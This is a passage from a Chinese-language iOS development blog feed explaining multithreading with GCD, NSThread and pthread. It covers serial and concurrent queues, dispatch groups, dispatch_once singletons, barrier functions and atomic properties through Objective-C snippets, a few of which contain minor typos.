<p>另外关于串行，并行和同步异步之间的关系还可以参考<a href="https://liufubo1991.github.io/2017/07/13/%E5%90%8C%E6%AD%A5%E3%80%81%E5%BC%82%E6%AD%A5%E4%B8%8E%E4%B8%B2%E8%A1%8C%E3%80%81%E5%B9%B6%E8%A1%8C%E7%9A%84%E5%85%B3%E7%B3%BB/%E5%90%8C%E6%AD%A5%E3%80%81%E5%BC%82%E6%AD%A5%E4%B8%8E%E4%B8%B2%E8%A1%8C%E3%80%81%E5%B9%B6%E8%A1%8C%E7%9A%84%E5%85%B3%E7%B3%BB/" target="_blank" rel="external">博客</a></p>
<h2 id="关于GCD的一些Demo演练"><a href="#关于GCD的一些Demo演练" class="headerlink" title="关于GCD的一些Demo演练"></a>关于GCD的一些Demo演练</h2><p>学习了关于GCD的一些基本用法之后，我们也需要来进行一些demo的演练来满足我们的日常需求：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-05%20%E4%B8%8B%E5%8D%882.46.24.png" alt="屏幕快照 2017-10-05 下午2.46.24.png" title="" class="">
                <p>屏幕快照 2017-10-05 下午2.46.24.png</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">//首先分析1，2在子线程顺序执行，所以是异步串行队列</div><div class="line">- (void)demo&#123;</div><div class="line">    //创建串行队列</div><div class="line">    dispatch_queue_t serialQueue = dispatch_queue_create(&quot;serialQueue&quot;, DISPATCH_QUEUE_SERIAL);</div><div class="line">    dispatch_async(serialQueue, ^&#123;</div><div class="line">        NSLog(@&quot;任务1 %@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;);</div><div class="line">    dispatch_async(serialQueue, ^&#123;</div><div class="line">        NSLog(@&quot;任务2 %@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;);</div><div class="line">    //完成之后通知主线程执行3，4</div><div class="line">    dispatch_sync(serialQueue, ^&#123;</div><div class="line">        dispatch_async(dispatch_get_main_queue(),^&#123;</div><div class="line">            NSLog(@&quot;任务3 %@&quot;, [NSThread currentThread]);</div><div class="line">        &#125;);</div><div class="line">        dispatch_async(dispatch_get_main_queue(),^&#123;</div><div class="line">            NSLog(@&quot;任务4 %@&quot;, [NSThread currentThread]);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">    //完成之后再并发执行任务5，6，7，这个时候就需要用到全局并发队列，要先获取到主队列</div><div class="line">    dispatch_async(dispatch_get_main_queue(), ^&#123;</div><div class="line">       dispatch_async(dispatch_get_global_queue(0, 0), ^&#123;</div><div class="line">           NSLog(@&quot;任务5 %@&quot;, [NSThread currentThread]);</div><div class="line">       &#125;);</div><div class="line">       dispatch_async(dispatch_get_global_queue(0, 0), ^&#123;</div><div class="line">           NSLog(@&quot;任务6 %@&quot;, [NSThread currentThread]);</div><div class="line">       &#125;);</div><div class="line">       dispatch_async(dispatch_get_global_queue(0, 0), ^&#123;</div><div class="line">           NSLog(@&quot;任务7 %@&quot;, [NSThread currentThread]);</div><div class="line">       &#125;);</div><div class="line">    &#125;);   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果将它们队列之间的关系画一张图的话应该是如下图所示（手画的有点丑）：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/7DA841E463C1B07B74B06F79BE0D16C2.png" alt="7DA841E463C1B07B74B06F79BE0D16C2.png" title="" class="">
                <p>7DA841E463C1B07B74B06F79BE0D16C2.png</p>
            </figure>
<h2 id="延时执行和队列组"><a href="#延时执行和队列组" class="headerlink" title="延时执行和队列组"></a>延时执行和队列组</h2><h4 id="延时执行"><a href="#延时执行" class="headerlink" title="延时执行"></a>延时执行</h4><p>在iOS中我们常常需要一个方法延时去执行，而实现的方式有很多种，下面的简单的介绍一下常用的几种延时执行的方式</p>
<ol>
<li>使用NSTimer，也就是定时器：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">NSTimer *timer = [NSTimer timerWithTimeInterval:1 target:self selector:@selector(task) userInfo:nil repeats:NO];</div></pre></td></tr></table></figure>
<ol>
<li>使用performSelector的方法：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[self performSelector:@selector(task) withObject:nil afterDelay:1];</div></pre></td></tr></table></figure>
<ol>
<li>使用GCD实现延时：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">	1.参数1是表示延时的时间</div><div class="line">	2.参数2是队列</div><div class="line">	3.参数3是任务</div><div class="line">*/</div><div class="line">//dispatch_time生成事件，纳秒作为计时单位，精度高</div><div class="line">//而且这个方法是异步执行的，效率也更高</div><div class="line">dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123;</div><div class="line">    NSLog(@&quot;延时执行&quot;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h4 id="队列组"><a href="#队列组" class="headerlink" title="队列组"></a>队列组</h4><p>之前我们在写实战的Demo的时候，因为需求的原因，在很多队列之间进行跳转和切换，但是有些时候实现这样的功能我们还可以直接的使用队列组，队列组只有异步方法能添加任务，当组里所有任务都执行完后，它会通过一个方法通知我们</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">- (void)demo&#123;</div><div class="line">  	//创建组</div><div class="line">    dispatch_group_t group = dispatch_group_create();</div><div class="line">  	//开启异步任务</div><div class="line">  	dispatch_group_async(group, dispatch_get_global_queue(0,0), ^&#123;</div><div class="line">         for (NSInteger i = 0; i &lt; 3; i++) &#123;</div><div class="line">          NSLog(@&quot;group-01 - %@&quot;, [NSThread currentThread]);</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  	//都完成后会自动通知</div><div class="line">  	dispatch_group_notify(group, dispatch_get_main_queue(), ^&#123;</div><div class="line">      	NSLog(@&quot;完成 - %@&quot;, [NSThread currentThread]);</div><div class="line">  	&#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面来说一下dispatch_group_async这个方法的底层调用的是什么方法，如果我们使用一下man命令：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-05%20%E4%B8%8B%E5%8D%885.15.15.png" alt="屏幕快照 2017-10-05 下午5.15.15.png" title="" class="">
                <p>屏幕快照 2017-10-05 下午5.15.15.png</p>
            </figure>
<p>如果你使用的是MRC的话，应该就会用到retain和release方法，在ARC中我们可以忽略这两个方法，首先我们会使用<code>dispatch_group_enter(group);</code>进入到这个队列组，然后转到队列中，执行其中的任务,最后使用<br><code>dispatch_group_leave(group);</code>离开这个队列组。</p>
<h2 id="GCD实现单例"><a href="#GCD实现单例" class="headerlink" title="GCD实现单例"></a>GCD实现单例</h2><p>dispatch_once中的代码只会被执行一次，所以我们很容易的就会和单例结合到一起，也就是说如果我们将对象的实例化写到一次性执行中的话，那么我们每次访问的都是同一个对象，因为对象的实例化只会执行一次。</p>
<p>如果是在单线程中的话，可以通过静态变量实现，但是在多线程的情况下，有可能会返回不同的对象，如在单例对象初始化完成之前，多个线程同时访问单例，那么这些进程可能都获得了不同的单例对象，这也是为什么苹果提供了dispatch_once方法的原因。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">//自定义类方法</div><div class="line">+ (instancetype)defaultObject&#123;  </div><div class="line">    static SharedObject *sharedObject = nil;  </div><div class="line">	//一次性执行本身就是线程安全的</div><div class="line">  	static dispatch_once_t predicate;  </div><div class="line">    dispatch_once(&amp;predicate, ^&#123;  </div><div class="line">        sharedObject = [[SharedObject alloc] init];  </div><div class="line">    &#125;);  </div><div class="line">    return sharedObject;  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">static Person *_instance;</div><div class="line">//重写allocWithZone函数，alloc底层调用的就是allocWithZone</div><div class="line">+ (instancetype)allocWithZone:(struct _NZZone *)zone&#123;</div><div class="line">  //加互斥锁解决线程安全问题  </div><div class="line">  @synchronized(self)&#123;</div><div class="line">        if(_instance == nil)&#123;</div><div class="line">        	_instance = [super allocWithZone];</div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line">  	return _instance;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//为了完善同样的话可以重写它的对象方法，但是要先遵守对应的协议</div><div class="line">- (id)copyWithZone:(NSZone *)zone&#123;</div><div class="line">    return _instance;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (id)mutableCopywithZone:(NSZone *)zone&#123;</div><div class="line">    return _instance;</div><div class="line">&#125;</div><div class="line">//以上就是一个完整的单例方法了</div></pre></td></tr></table></figure>
<p>顺带也要提一下单例模式在MRC中的写法，只需要改动其中部分即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//因为单例对象是供全局使用的，所以我们如果正常的release掉肯定会报错</div><div class="line">- (oneway void)release&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">- (instancetype)retain&#123;</div><div class="line">    return _instance;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//在非ARC环境下，单例对象都会重写其retainCount方法，返回一个最大值</div><div class="line">- (NSUInteger)retainCount&#123;</div><div class="line">    return MAXFLOAT;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//为了实现通用，我们还可以加上一个条件编译</div><div class="line">#if __has_feature(objc_arc)</div><div class="line">	//不作处理</div><div class="line">#else</div><div class="line">	//MRC环境，将上面的代码放到这里</div><div class="line">#endif</div></pre></td></tr></table></figure>
<p>那么这个<code>dispatch_once</code>函数到底是如何实现线程安全的呢？下面就来解释一下，首先查到dispatch_once_t被定义为长整型，那么 dispatch_once函数是如何让两个同时调用这个方法的进程只执行一次函数的block区块呢？</p>
<p>我们可以通过打印predicate的值发现，在block被访问过之后，这个值会更改为-1，所以我们猜测这个机制是以这个值作为判断条件的：</p>
<p> <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-05%20%E4%B8%8B%E5%8D%886.03.41.png" alt="屏幕快照 2017-10-05 下午6.03.41.png"></p>
<p>如果可以参考一下这个函数的实现进行分析的话就会有更加直观的理解，所以现在对于其中真正的多线程保护逻辑还是并不清楚的，通过查看了其中一堆乱七八糟的宏定义之后更加蒙圈了..</p>
<h4 id="单例模式的抽取"><a href="#单例模式的抽取" class="headerlink" title="单例模式的抽取"></a>单例模式的抽取</h4><p>在一个项目中，我们往往用到的不止一个单例对象，如果每次要实现单例对象的时候都把上面的代码复制修改一下，又未免显得过于繁琐，于是我们想到是否能用<code>继承</code>来解决这个问题，经过试验之后发现其实是不可行的，继承过去之后因为那个静态变量也是继承的，只能被调用一次，所以如果是继承关系的话，谁先实例化那么这个单例对象就是谁，无法达到我们想要的效果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//我们可以把单例的代码抽取出来变成一个宏</div><div class="line">#define SingleH +(instancetype)shareTool;</div><div class="line">#define SingleM //单例代码部分,但是注意要用连接符链接，不然就只是宏定义的就只要单独的一行</div></pre></td></tr></table></figure>
<p>写到这里还是不够好，因为为了要应对不同的单例对象，生成的单例对象名字应该作为一个参数传入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define SingleH(name) +(instancetype)share##name;</div></pre></td></tr></table></figure>
<p>如果是在MRC环境下，因为条件编译是不能放在宏里面的，所以就把宏放在条件编译里面，形成最后的完整版</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define SingleH(name) +(instancetype)share##name;</div><div class="line">#if __has_feature(objc_arc)</div><div class="line">	//ARC的宏</div><div class="line">#else</div><div class="line">	//MRC的宏</div><div class="line">#endif</div></pre></td></tr></table></figure>
<h2 id="GCD中的栅栏函数"><a href="#GCD中的栅栏函数" class="headerlink" title="GCD中的栅栏函数"></a>GCD中的栅栏函数</h2><p>栅栏函数一般用于在异步并行队列中分割队列中的任务执行，如现在有个需求是先并发执行1，2任务，再执行3。那么就可以在中间插入一个栅栏函数，但是有一点要注意的是，栅栏函数不能使用全局并发队列。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//手动创建一个并发队列</div><div class="line">dispatch_queue_t queue = dispatch_queue_create(&quot;download&quot;, DISPATCH_QUEUE_CONCURRENT);</div><div class="line">dispatch_async(queue, ^&#123;</div><div class="line">   NSLog(@&quot;download1--%@&quot;,[NSThread currentThread]); </div><div class="line">&#125;);</div><div class="line">dispatch_async(queue, ^&#123;</div><div class="line">   NSLog(@&quot;download2--%@&quot;,[NSThread currentThread]); </div><div class="line">&#125;);</div><div class="line">dispatch_barrier_async(queue, ^&#123;</div><div class="line">   NSLog(@&quot;++++++++&quot;); </div><div class="line">&#125;);</div><div class="line">dispatch_async(queue, ^&#123;</div><div class="line">   NSLog(@&quot;download3--%@&quot;,[NSThread currentThread]); </div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>从打印结果可以看出已经生效：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-06%20%E4%B8%8A%E5%8D%8812.39.36.png" alt="屏幕快照 2017-10-06 上午12.39.36.png" title="" class="">
                <p>屏幕快照 2017-10-06 上午12.39.36.png</p>
            </figure></p>
<p>接下来就来列举一下栅栏函数在不同的使用环境下所产生的效果：</p>
<p>dispatch_barrier_async(dispatch_queue_t queue, dispatch_block_t block)  //异步</p>
<ul>
<li>与dispatch_get_global_queue(0, 0);(全局并发队列)一起使用,达不到栅栏的效果,官方文档有说;</li>
<li>与dispatch_get_main_queue()(主队列)一起使用,barrier前后任务串行执行,都在UI线程执行</li>
<li>与dispatch_queue_create(NULL, DISPATCH_QUEUE_SERIAL)(串行队列)一起使用,会创建一个线程,barrier前后的任务串行执行</li>
<li>与dispatch_queue_create(NULL, DISPATCH_QUEUE_CONCURRENT)(自定义并发队列)一起使用,创建多个线程,barrier前后的任务都是并行执行.</li>
</ul>
<p>dispatch_barrier_sync(dispatch_queue_t queue, dispatch_block_t block)  //同步</p>
<ul>
<li>与dispatch_get_global_queue(0, 0);(全局并发队列)一起使用,达不到栅栏的效果,官方文档有说;</li>
<li><strong>与dispatch_get_main_queue()(主队列)一起使用,程序会进入死锁状态!!!!!!!!(这个很容易忽略)</strong></li>
<li>与dispatch_queue_create(NULL, DISPATCH_QUEUE_SERIAL)(串行队列)一起使用,barrier在UI线程运行</li>
<li>与dispatch_queue_create(NULL, DISPATCH_QUEUE_CONCURRENT)(自定义并发队列)一起使用,barrier在UI线程运行</li>
</ul>
<p>所以一般栅栏函数都是会使用异步的（因为同步压根没有什么卵用，还容易造成线程死锁）</p>
<h2 id="GCD快速迭代"><a href="#GCD快速迭代" class="headerlink" title="GCD快速迭代"></a>GCD快速迭代</h2><p>一般我们在for循环中任务都是在同一个线程中顺序执行的，但是这样的行为在我们对于for循环中的任务执行顺序没有要求的时候，显然是非常的浪费资源的，这个时候我们就可以使用GCD快速迭代来实现资源的有效利用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">第一个参数：遍历的次数</div><div class="line">第二个参数：队列（并发队列）</div><div class="line">第三个参数：索引</div><div class="line">*/</div><div class="line">dispatch_apply(10, dispatch_get_global_queue(0,0), ^(size_t index)&#123;</div><div class="line">    NSLog(@&quot;---%@&quot;, index, [NSThread currentThread]);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>比如我们要遍历一个目录下面的所有文件然后剪切到另一个目录下面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">- (void)moveFile&#123;</div><div class="line">  NSString from = @&quot;/Users/test/Desktop/from&quot;;</div><div class="line"></div><div class="line">  NSString *to = @&quot;/Users/test/Desktop/to&quot;;</div><div class="line">  		</div><div class="line">  NSArray *subPaths = [[NSFileManager defaultmanager] subpathsAtPath:from];</div><div class="line">  		</div><div class="line">  NSInteger count = subPaths.count;</div><div class="line">  </div><div class="line">  dispatch_apply(count, dispatch_get_global_queue(0,0), ^(size_t index)&#123;</div><div class="line"></div><div class="line">  NSString *fullPath = [from stringByAppendingPathComponent:subPath[index]];</div><div class="line">    	</div><div class="line">  NSString *toFullPath = [to stringByAppendingPathComponent:subPath[index]];</div><div class="line">	    </div><div class="line">  [[NSFileManager defaultManager] moveItemAtPath:fullPath toPath:toFullPath error:nil];</div><div class="line">	</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="GCD补充"><a href="#GCD补充" class="headerlink" title="GCD补充"></a>GCD补充</h2><p>一般我们在异步执行的时候调用的都是<code>dispatch_async</code>方法，GCD中还提供了另外一种方法，不同的是它们封装任务的方法，<code>dispatch_async</code>是使用block的方式来封装任务，而<code>dispatch_async_f</code>是通过函数的方式来进行封装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">dispatch_async_f(dispatch_get_global_queue(0, 0), NULL, task);</div><div class="line">dispatch_async_f(dispatch_get_global_queue(0, 0), NULL, task);</div><div class="line"></div><div class="line">void task(void *param)&#123;</div><div class="line">    NSLog(@&quot;%@---%@&quot;, __func__, [NSthread currentThread]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>参考博客</p>
<ul>
<li><a href="http://blog.csdn.net/mlibai/article/details/46945331" target="_blank" rel="external">dispatch_once剖析</a></li>
<li><a href="http://www.jianshu.com/p/0b0d9b1f1f19" target="_blank" rel="external">关于iOS多线程，你看我就够了</a></li>
<li><a href="http://www.jianshu.com/p/481e4bef1bd6" target="_blank" rel="external">iOS中的多线程学习笔记</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 串/并行队列 GCD实现单例 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS多线程]]></title>
      <url>/2017/09/29/iOS%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>为了追求极致的性能，iOS中的多线程是必经之路</p>
<a id="more"></a>
<h1 id="多线程的基本概念（iOS）"><a href="#多线程的基本概念（iOS）" class="headerlink" title="多线程的基本概念（iOS）"></a>多线程的基本概念（iOS）</h1><p>再说多线程之前首先要普及一下同步和异步的概念，我们之前在写程序的时候，代码都是顺序执行的，一个线程中执行多个任务，一次处理一个。而异步则是多个人处理多个任务，任务同时执行。</p>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>进程之间是独立的，每个进程都运行在其专用的受保护的内存空间中，通过活动监视器可以查看Mac系统中所开启的进程。</p>
<p>1个程序由一个或多个线程组成，线程是进程的基本执行单元，一个进程的所有任务都在线程中执行。但是事实上单核CPU并不能分别执行多个线程，而是采用了快速切换的方式，显现出一种同时执行的假象，就像我们看电影的时候只是在快速地播放图片而已。</p>
<p>但是有一点需要注意的就是如果线程的数目非常的多，cpu在n个线程之间切换，消耗大量的cpu资源，每个线程被调度的次数会降低，线程的执行效率也会降低，多线程的缺点在于其空间成本和时间成本，不是线程开的越多越好，吃鸡虽好也不能多吃诶。</p>
<p>同时多线程的优点也是十分的明显，可以适当提高程序的执行效率和资源的利用率(CPU&amp;内存，这么好的电脑自然要物尽其用)，线程上的任务在执行完之后也会自动销毁。</p>
<h4 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h4><p>一个程序运行后，默认会开启一个线程，成为主线程或者UI线程，主线程一般用来刷新UI界面，处理UI事件（点击，滚动，拖拽）。</p>
<p>要注意的是，不能在主线程上执行耗时的操作，不然这种操作会卡死线程，严重影响UI的流畅</p>
<h4 id="多线程的实现方案"><a href="#多线程的实现方案" class="headerlink" title="多线程的实现方案"></a>多线程的实现方案</h4><table>
<thead>
<tr>
<th>技术方案</th>
<th>简介</th>
<th>语言</th>
<th>线程生命周期</th>
<th>使用频率</th>
</tr>
</thead>
<tbody>
<tr>
<td>pthread</td>
<td>一套通用的多线程API</td>
<td>C</td>
<td>程序员管理</td>
<td>几乎不用</td>
</tr>
<tr>
<td>NSThread</td>
<td>可以直接操作线程对象，使用更加面向对象</td>
<td>OC</td>
<td>程序员管理</td>
<td>偶尔使用</td>
</tr>
<tr>
<td>GCD</td>
<td>替换NSThread等线程技术，充分利用设备的多核</td>
<td>C</td>
<td>自动管理</td>
<td>经常使用</td>
</tr>
<tr>
<td>NSOperation</td>
<td>基于GCD，并在此之上做了一些扩展，更加面向对象</td>
<td>OC</td>
<td>自动管理</td>
<td>经常使用</td>
</tr>
</tbody>
</table>
<h3 id="pthread"><a href="#pthread" class="headerlink" title="pthread"></a>pthread</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">//但是这个只是作为一个了解，一般在iOS的项目中是不会使用这种写法</div><div class="line"></div><div class="line">- (void)touchesBegan:(NSSet&lt;UITouch *&gt; *)touches withEvent:(UIEvent *)event&#123;</div><div class="line">    NSLog(@&quot;%@&quot;, [NSThread currentThread]);</div><div class="line">    [self demo];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)demo&#123;</div><div class="line">    //参数1:pthread_t 线程的标识</div><div class="line">    //参数2:attr 线程的属性</div><div class="line">    //参数3:函数签名,void * 约等于OC中的id</div><div class="line">    //参数4:给函数参数</div><div class="line"></div><div class="line">    //__bridge:默认ARC下对OC对象有内存管理，不对C变量管理，桥接的作用是C变量在合适的时候释放</div><div class="line">    pthread_t PID;</div><div class="line">    NSString *str = @&quot;str&quot;;</div><div class="line">    int result =  pthread_create(&amp;PID, NULL, task, (__bridge void *)(str));</div><div class="line">    if(result == 0) NSLog(@&quot;OK&quot;);</div><div class="line">    else NSLog(@&quot;fail&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//线程要运行的函数</div><div class="line">void * task (void * param)&#123;</div><div class="line">    NSString *str = (__bridge NSString *)(param);</div><div class="line">    NSLog(@&quot;task is running %@-------&gt;%@ \n&quot;, [NSThread currentThread], str);</div><div class="line">    return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="NSThread"><a href="#NSThread" class="headerlink" title="NSThread"></a>NSThread</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">- (void)demo&#123;</div><div class="line">    //参数1:对象</div><div class="line">    //参数2:方法</div><div class="line">    //参数3:方法的参数</div><div class="line">    NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(task) object:nil];</div><div class="line">    //开启线程</div><div class="line">    [thread start];</div><div class="line">  	//上述方法也可以使用一行代码搞定</div><div class="line">  	[NSThread detachNewThreadSelector:@selector(task) toTarget:self withObject:nil];</div><div class="line">  	//还有一种方法是隐式创建线程</div><div class="line">  	[self performSelectorInBackground:@selector(task) withObject:nil];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)task&#123;</div><div class="line">    NSLog(@&quot;task is running %@&quot;, [NSThread currentThread]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>线程的状态：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/thread.jpg" alt="thread.jpg" title="" class="">
                <p>thread.jpg</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//一些常用的方法介绍</div><div class="line"></div><div class="line">//阻塞进程</div><div class="line">[NSThread sleepForTimeInterval:1];</div><div class="line">[NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:2]];</div><div class="line">//手动杀死线程</div><div class="line">[NSThread exit];</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//一些常用属性介绍</div><div class="line"></div><div class="line">//线程的名字</div><div class="line">thread.name = @&quot;thread&quot;;</div><div class="line">//优先级,取值范围为0.0-1.0，默认是0.5，1.0表示最高，这个优先级只是表示被CPU调用的几率大小，就算是0也是会被调用的。</div><div class="line">thread.threadPriority = 0;</div></pre></td></tr></table></figure>
<h3 id="关于原子属性"><a href="#关于原子属性" class="headerlink" title="关于原子属性"></a>关于原子属性</h3><p>如果是原子属性，那么在多个线程环  境下，只能有一个线程对你的属性进行赋值，读取无所谓</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@property (atomic, strong) NSObject *obj;</div></pre></td></tr></table></figure>
<p><code>atomic</code>: 原子操作（原子性是指事务的一个完整操作，操作成功就提交，反之就回滚. 原子操作就是指具有原子性的操作）在objective-c 属性设置里面默认的就是atomic，意思就是setter/getter函数是一个原子操作，如果多线程同时调用setter时，不会出现某一个线程执行完setter所有语句之前，另一个线程就开始执行setter，相当于函数头尾加了自旋锁. 这样的话并发访问性能会比较低.</p>
